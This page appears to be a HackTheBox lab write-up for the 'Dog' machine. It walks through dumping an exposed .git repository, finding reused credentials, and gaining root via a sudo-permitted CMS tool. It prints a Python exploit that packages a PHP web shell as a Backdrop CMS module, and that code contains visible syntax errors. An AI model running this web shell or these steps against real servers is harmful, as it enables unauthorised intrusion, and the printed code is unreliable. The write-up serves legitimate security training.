@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Dog 207b952552918059ae99cbb25a8392ef | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Dog 207b952552918059ae99cbb25a8392ef" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Dog" />
+<meta property="og:description" content="Dog" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-17T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Dog 207b952552918059ae99cbb25a8392ef" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-17T16:05:57+00:00","datePublished":"2025-07-17T16:05:57+00:00","description":"Dog","headline":"Dog 207b952552918059ae99cbb25a8392ef","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html"},"url":"https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Dog 207b952552918059ae99cbb25a8392ef</h1>
+  
+  <div class="post-date">
+    Published on 17 Jul 2025
+    
+  </div>
+  
+  <h1 id="dog">Dog</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, there are only two open ports, check the web application at first instance</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image.png" alt="image.png" /></p>
+
+<p>A blog talking about dogs and their issues</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_1.png" alt="image.png" /></p>
+
+<p>We can login and reset password, but apparently we cannot register ourselves</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_2.png" alt="image.png" /></p>
+
+<p>It is powered by backdrop Content Management System which is open source written in php</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_3.png" alt="image.png" /></p>
+
+<p>We can see its repository on github, and perform a quick checking of access to files that we don’t suppose to, we even have access to <code class="language-plaintext highlighter-rouge">robots.txt</code> but not useful information were found in there</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_4.png" alt="image.png" /></p>
+
+<p>We have access to <code class="language-plaintext highlighter-rouge">.git</code> directory which means that we can extract full repository content from here</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_5.png" alt="image.png" /></p>
+
+<p>Without using tools yet we have got a username</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_6.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Using <code class="language-plaintext highlighter-rouge">git-dumper</code> we can extract all source code into a directory</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_7.png" alt="image.png" /></p>
+
+<p>We can perform a manual scanning review on configuration and settings file, where we found a password</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_8.png" alt="image.png" /></p>
+
+<p>A hash salt is also present</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_9.png" alt="image.png" /></p>
+
+<p>We need to find usernames in here, the first we found didn’t work, use the domain as filter to find <code class="language-plaintext highlighter-rouge">Tiffany</code></p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_10.png" alt="image.png" /></p>
+
+<p>Her email address is in an update settings file</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_11.png" alt="image.png" /></p>
+
+<p>Log in the graphical interface as Tiffany</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_12.png" alt="image.png" /></p>
+
+<p>We have a lot of users with “administrator” role in here</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_13.png" alt="image.png" /></p>
+
+<p>Until now, we haven’t found CMS version, use this same filter to find an authenticated Remote Code Execution</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_14.png" alt="image.png" /></p>
+
+<p>We have and exploit that creates a php reverse shell and a module.info file, packages them into a zip archive and install it as a module, Once installed the reverse can be triggered by simply sending a GET request to the file</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">create_files</span><span class="p">():</span>
+	<span class="n">info_content</span> <span class="o">=</span> <span class="s">"""
+    type = module
+    name = Block
+    description = Controls the visual building blocks a page is constructed
+    with. Blocks are boxes of content rendered into an area, or region, of a
+    web page.
+    package = Layouts
+    tags[] = Blocks
+    tags[] = Site Architecture
+    version = BACKDROP_VERSION
+    backdrop = 1.x
+
+    configure = admin/structure/block
+
+    ; Added by Backdrop CMS packaging script on 2024-03-07
+    project = backdrop
+    version = 1.27.1
+    timestamp = 1709862662
+    """</span>
+    <span class="n">shell_info_path</span> <span class="o">=</span> <span class="s">"shell/shell.info"</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+	  
+	  <span class="n">shell_content</span> <span class="o">=</span>  <span class="s">"""
+    &lt;html&gt;
+    &lt;body&gt;
+    &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+    &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+    &lt;input type="SUBMIT" value="Execute"&gt;
+    &lt;/form&gt;
+    &lt;pre&gt;
+    &lt;?php
+    if(isset($_GET['cmd']))
+    {
+    system($_GET['cmd']);
+    }
+    ?&gt;
+    &lt;/pre&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """</span>
+    <span class="n">shell_php_path</span> <span class="o">=</span> <span class="s">"shell/shell.php"</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_php_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell_content</span><span class="p">)</span>
+	  <span class="k">return</span> <span class="n">shell_info_path</span><span class="p">,</span> <span class="n">shell_php_path</span>
+
+<span class="k">def</span> <span class="nf">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">):</span>
+	<span class="n">zip_filename</span> <span class="o">=</span> <span class="s">"shell.zip"</span>
+	<span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">Zipfile</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
+		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.info'</span><span class="p">)</span>
+		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.php'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Remote command execution exploit"</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generating..."</span><span class="p">)</span>
+	
+	<span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span> <span class="o">=</span> <span class="n">create_files</span><span class="p">()</span>
+	<span class="n">zip_filename</span> <span class="o">=</span> <span class="n">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">)</span>
+	
+	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generated!"</span><span class="p">,</span> <span class="n">zip_filename</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Go to "</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/modules/install and upload the "</span> <span class="o">+</span>
+          <span class="n">zip_filename</span> <span class="o">+</span> <span class="s">" for Manual Installation."</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"Your shell address:"</span><span class="p">,</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/modules/shell/shell.php"</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: python script.py [url]"</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_15.png" alt="image.png" /></p>
+
+<p>The zip file were generated and it indicates to go ourselves to install the module to be aware of what is happening. In this dashboard section we find a warning announcing that zip files are not allowed due to its extension is not loaded</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_16.png" alt="image.png" /></p>
+
+<p>Try with manual installation</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_17.png" alt="image.png" /></p>
+
+<p>Only <code class="language-plaintext highlighter-rouge">.tar.gz</code> files are allowed</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_18.png" alt="image.png" /></p>
+
+<p>Use the files that previously generated by the python script and transform them into the required compatible format</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_19.png" alt="image.png" /></p>
+
+<p>Once the installation is completed successfully</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_20.png" alt="image.png" /></p>
+
+<p>Access to the shell using the <code class="language-plaintext highlighter-rouge">cmd</code> variable, during enumeration of users with valid shells, we identify johncusack, further investigation revealed that this user reused Tiffany’s password, which allowed successful ssh authentication</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_21.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>As johncusack user we can run as root bee binary</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_22.png" alt="image.png" /></p>
+
+<p>Basically this tool helps developers to automate tasks, execute code and access content efficiently in backdrop CMS</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_23.png" alt="image.png" /></p>
+
+<p>After checking its flags we found that it allows to execute php eval function</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_24.png" alt="image.png" /></p>
+
+<p>Immediately we ran <code class="language-plaintext highlighter-rouge">system(”id”)</code> command in the home directory but it didn’t work</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_25.png" alt="image.png" /></p>
+
+<p>So we checked the status of the installation, and received a message pointing out that the command should be run where the backdrop files are located</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_26.png" alt="image.png" /></p>
+
+<p>No it is working</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_27.png" alt="image.png" /></p>
+
+<p>Root shell is as simple as</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_28.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!@#</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html';
+     this.page.identifier = '/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e';
+     this.page.title = 'Dog 207b952552918059ae99cbb25a8392ef';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html">
+            Checker 1eab952552918014a431c736eae89e54
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
